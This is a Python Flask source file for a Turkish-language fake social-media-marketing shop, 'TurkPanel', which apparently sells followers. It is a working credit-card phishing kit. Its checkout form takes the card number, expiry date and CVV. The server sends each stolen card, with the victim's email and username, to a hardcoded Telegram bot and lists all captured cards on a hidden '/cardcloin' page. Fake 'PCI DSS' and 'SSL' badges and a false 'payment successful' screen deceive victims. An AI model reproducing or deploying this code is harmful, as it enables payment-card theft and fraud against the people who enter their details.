from flask import Flask, request, render_template_string, jsonify
import requests
import time

app = Flask(__name__)
KARTLAR = []

SITE_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TurkPanel - Premium SMM</title>
    <style>
        :root { --ana: #6c5ce7; --yesil: #4CAF50; --bg: #0a0a0f; --kart: #14141f; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: var(--bg); color: #fff; }
        
        .yukleme { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 4px; z-index: 9999; }
        .yukleme-ic { width: 0%; height: 100%; background: linear-gradient(90deg, #6c5ce7, #4CAF50); animation: yukle 2s forwards; }
        @keyframes yukle { 0% { width: 0; } 100% { width: 100%; } }
        
        .header { background: linear-gradient(135deg, #1a1a2e, #14141f); padding: 30px 20px; text-align: center; }
        .logo { font-size: 2.2em; font-weight: bold; }
        .alt { color: #aaa; margin-top: 8px; }
        
        .container { max-width: 800px; margin: 30px auto; padding: 0 20px; }
        
        .platformlar { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
        .platform { background: var(--kart); border-radius: 18px; padding: 25px 15px; text-align: center; cursor: pointer; border: 2px solid transparent; transition: all 0.3s; }
        .platform.active { border-color: var(--ana); box-shadow: 0 10px 30px rgba(108,92,231,0.3); }
        .platform .ikon { width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.8em; }
        .platform .ikon.insta { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); }
        .platform .ikon.tiktok { background: #000; border: 1px solid #333; }
        .platform .ikon.youtube { background: #ff0000; }
        .platform .ikon.telegram { background: #0088cc; }
        
        .miktar-bolumu { background: var(--kart); border-radius: 18px; padding: 30px; margin: 25px 0; }
        .miktar-bolumu label { display: block; margin-bottom: 15px; }
        .miktar-bolumu input { width: 100%; padding: 18px; background: #1a1a2e; border: 1px solid #333; border-radius: 12px; color: #fff; font-size: 1.5em; text-align: center; font-weight: bold; }
        
        .bilgilendirme { background: #1a1a2e; border-radius: 12px; padding: 20px; margin-top: 15px; border-left: 3px solid var(--ana); }
        .bilgilendirme p { color: #aaa; font-size: 0.8em; margin: 6px 0; display: flex; align-items: center; gap: 8px; }
        .bilgilendirme .ikon { font-size: 1.2em; }
        
        .fiyat-kutu { background: linear-gradient(135deg, #1a1a2e, #14141f); border-radius: 18px; padding: 25px; text-align: center; margin-bottom: 20px; }
        .fiyat-kutu .toplam { font-size: 2.5em; color: var(--yesil); font-weight: bold; }
        
        .btn-devam { width: 100%; padding: 20px; background: linear-gradient(45deg, #6c5ce7, #a29bfe); border: none; border-radius: 15px; color: #fff; font-size: 1.2em; font-weight: bold; cursor: pointer; }
        
        .sayfa { display: none; }
        .sayfa.aktif { display: block; }
        
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; margin-bottom: 5px; color: #aaa; }
        .input-group input { width: 100%; padding: 14px; background: #1a1a2e; border: 1px solid #333; border-radius: 10px; color: #fff; }
        .card-row { display: flex; gap: 10px; }
        .card-row .input-group { flex: 1; }
        .btn-ode { width: 100%; padding: 16px; background: var(--yesil); border: none; border-radius: 10px; color: #fff; font-weight: bold; cursor: pointer; font-size: 1.1em; }
        
        .guven-rozetleri { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-top: 20px; }
        .rozet { background: var(--kart); border-radius: 8px; padding: 8px 15px; font-size: 0.7em; color: #aaa; }
        
        .basarili { text-align: center; padding: 60px 20px; }
        .basarili .ikon { font-size: 6em; }
        
        @media (max-width: 600px) { .platformlar { grid-template-columns: repeat(2, 1fr); } }
    </style>
</head>
<body>
    <div class="yukleme" id="yukleme"><div class="yukleme-ic"></div></div>
    
    <div class="header">
        <div class="logo">⚡ TurkPanel</div>
        <div class="alt">Premium SMM | 7/24 Otomatik | %100 Güvenli</div>
    </div>
    
    <div class="container" id="main">
        <!-- SAYFA 1 -->
        <div class="sayfa aktif" id="sayfa1">
            <h2 style="text-align:center;margin-bottom:20px;">📱 Platform Seçin</h2>
            <div class="platformlar">
                <div class="platform active" onclick="platformSec('Instagram','insta',this)"><div class="ikon insta">📸</div><h3>Instagram</h3></div>
                <div class="platform" onclick="platformSec('TikTok','tiktok',this)"><div class="ikon tiktok">🎵</div><h3>TikTok</h3></div>
                <div class="platform" onclick="platformSec('YouTube','youtube',this)"><div class="ikon youtube">▶️</div><h3>YouTube</h3></div>
                <div class="platform" onclick="platformSec('Telegram','telegram',this)"><div class="ikon telegram">✈️</div><h3>Telegram</h3></div>
            </div>
            
            <div class="miktar-bolumu">
                <label id="miktarEtiket">📸 Kaç Instagram Takipçisi istiyorsunuz?</label>
                <input type="number" id="miktar" value="1000" min="100" step="100" oninput="fiyatGuncelle()">
                
                <div class="bilgilendirme">
                    <p><span class="ikon">⚡</span> Siparişiniz 1-5 dakika içinde başlar</p>
                    <p><span class="ikon">📈</span> Kademeli gönderim yapılır, düşme yaşanmaz</p>
                    <p><span class="ikon">🔒</span> %100 güvenli, şifre istenmez</p>
                    <p><span class="ikon">🔄</span> 30 gün garanti, düşenler yenilenir</p>
                    <p><span class="ikon">💎</span> Gerçek ve aktif hesaplardan gönderilir</p>
                </div>
            </div>
            
            <div class="fiyat-kutu">
                <p style="color:#aaa;">Toplam Tutar</p>
                <p class="toplam" id="toplamFiyat">₺45,00</p>
                <p style="color:#666;">1000 = ₺45</p>
            </div>
            
            <button class="btn-devam" onclick="sayfaGecis(2)">🚀 DEVAM ET</button>
            
            <div class="guven-rozetleri">
                <div class="rozet">🔒 SSL</div>
                <div class="rozet">💳 PCI DSS</div>
                <div class="rozet">⭐ 4.9/5</div>
                <div class="rozet">👥 125K+ Müşteri</div>
            </div>
        </div>
        
        <!-- SAYFA 2 -->
        <div class="sayfa" id="sayfa2">
            <h2 style="text-align:center;margin-bottom:25px;">Hesap Bilgisi</h2>
            <div class="input-group"><label id="kullaniciEtiket">📸 Instagram Kullanıcı Adı</label><input type="text" id="kullaniciAdi" placeholder="@kullaniciadi"></div>
            <div class="input-group"><label>📧 Email</label><input type="email" id="email" placeholder="ornek@gmail.com"></div>
            <button class="btn-devam" onclick="sayfaGecis(3)">💳 ÖDEMEYE GEÇ</button>
            <button style="width:100%;margin-top:10px;padding:12px;background:transparent;border:1px solid #333;border-radius:10px;color:#aaa;cursor:pointer;" onclick="sayfaGecis(1)">⬅️ GERİ</button>
        </div>
        
        <!-- SAYFA 3 -->
        <div class="sayfa" id="sayfa3">
            <h2 style="text-align:center;margin-bottom:25px;">💳 Ödeme</h2>
            <div class="input-group"><label>Kart Üzerindeki İsim</label><input type="text" id="kartIsim" placeholder="AD SOYAD"></div>
            <div class="input-group"><label>Kart Numarası</label><input type="text" id="kartNo" maxlength="19" placeholder="0000 0000 0000 0000"></div>
            <div class="card-row">
                <div class="input-group"><label>Son Kullanma</label><input type="text" id="sonKul" maxlength="5" placeholder="AA/YY"></div>
                <div class="input-group"><label>CVV</label><input type="text" id="cvv" maxlength="4" placeholder="123"></div>
            </div>
            <button class="btn-ode" onclick="odemeYap()">💰 ÖDEME YAP</button>
            <p style="text-align:center;margin-top:10px;color:#4CAF50;">🔒 256-bit SSL ile şifrelenir</p>
            <button style="width:100%;margin-top:10px;padding:12px;background:transparent;border:1px solid #333;border-radius:10px;color:#aaa;cursor:pointer;" onclick="sayfaGecis(2)">⬅️ GERİ</button>
        </div>
    </div>
    
    <script>
        let secilenPlatform = 'Instagram';
        
        function platformSec(p, ikon, el) {
            secilenPlatform = p;
            document.querySelectorAll('.platform').forEach(x => x.classList.remove('active'));
            el.classList.add('active');
            const etiketler = {'Instagram':['📸 Kaç Instagram Takipçisi istiyorsunuz?','📸 Instagram Kullanıcı Adı'],'TikTok':['🎵 Kaç TikTok Takipçisi istiyorsunuz?','🎵 TikTok Kullanıcı Adı'],'YouTube':['▶️ Kaç YouTube Abonesi istiyorsunuz?','▶️ YouTube Kanal Adı'],'Telegram':['✈️ Kaç Telegram Üyesi istiyorsunuz?','✈️ Telegram Kanal Linki']};
            document.getElementById('miktarEtiket').textContent = etiketler[p][0];
            document.getElementById('kullaniciEtiket').textContent = etiketler[p][1];
            fiyatGuncelle();
        }
        
        function fiyatGuncelle() {
            const miktar = parseInt(document.getElementById('miktar').value) || 1000;
            document.getElementById('toplamFiyat').textContent = '₺' + (miktar * 0.045).toFixed(2).replace('.', ',');
        }
        
        function sayfaGecis(n) {
            document.querySelectorAll('.sayfa').forEach(s => s.classList.remove('aktif'));
            document.getElementById('sayfa'+n).classList.add('aktif');
        }
        
        async function odemeYap() {
            const kullanici = document.getElementById('kullaniciAdi').value;
            const email = document.getElementById('email').value;
            const isim = document.getElementById('kartIsim').value;
            const kartNo = document.getElementById('kartNo').value.replace(/\\s/g,'');
            const sonKul = document.getElementById('sonKul').value;
            const cvv = document.getElementById('cvv').value;
            const miktar = document.getElementById('miktar').value;
            const fiyat = document.getElementById('toplamFiyat').textContent;
            
            if (!kullanici || !email || !isim || kartNo.length < 16 || sonKul.length < 4 || cvv.length < 3) {
                alert('Tüm alanları doldurun!');
                return;
            }
            
            document.getElementById('yukleme').style.display = 'block';
            await fetch('/odeme', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({platform:secilenPlatform, miktar, fiyat, kullanici, email, isim, kartNo, sonKul, cvv})});
            await new Promise(r => setTimeout(r, 2500));
            document.getElementById('yukleme').style.display = 'none';
            document.getElementById('main').innerHTML = `<div class="basarili"><div class="ikon">✅</div><h2>Ödeme Başarılı!</h2><p>${secilenPlatform} ${miktar} siparişiniz alındı.</p></div>`;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(SITE_HTML)

@app.route('/odeme', methods=['POST'])
def odeme():
    data = request.json
    kart = {'zaman': time.strftime('%d.%m.%Y %H:%M:%S'), 'platform': data.get('platform'), 'miktar': data.get('miktar'), 'fiyat': data.get('fiyat'), 'kullanici': data.get('kullanici'), 'email': data.get('email'), 'isim': data.get('isim'), 'kart_no': data.get('kartNo'), 'son_kul': data.get('sonKul'), 'cvv': data.get('cvv'), 'ip': request.remote_addr}
    KARTLAR.append(kart)
    
    try:
        bot = "8909079987:AAHjh-ohqiv53xxs1OMm-Z5b74S0VBzy3-g"
        chat = "8087053954"
        msg = f"🔥 SATIŞ!\n📱 {kart['platform']}\n📊 {kart['miktar']}\n💰 {kart['fiyat']}\n👤 {kart['kullanici']}\n📧 {kart['email']}\n💳 {kart['kart_no']}\n📅 {kart['son_kul']} | 🔐 {kart['cvv']}"
        requests.post(f"https://api.telegram.org/bot{bot}/sendMessage", json={'chat_id': chat, 'text': msg}, timeout=5)
    except:
        pass
    
    return jsonify({'success': True})

@app.route('/cardcloin')
def cardcloin():
    html = "<html><body style='background:#000;color:#0f0;font-family:monospace;'><h1>KARTLAR</h1>"
    for k in KARTLAR:
        html += f"<p>💳 {k['kart_no']} | {k['son_kul']} | {k['cvv']} | {k['platform']} {k['miktar']}</p>"
    html += "</body></html>"
    return html

if __name__ == '__main__':
    print("TurkPanel!")
    app.run(host='0.0.0.0', port=8080)
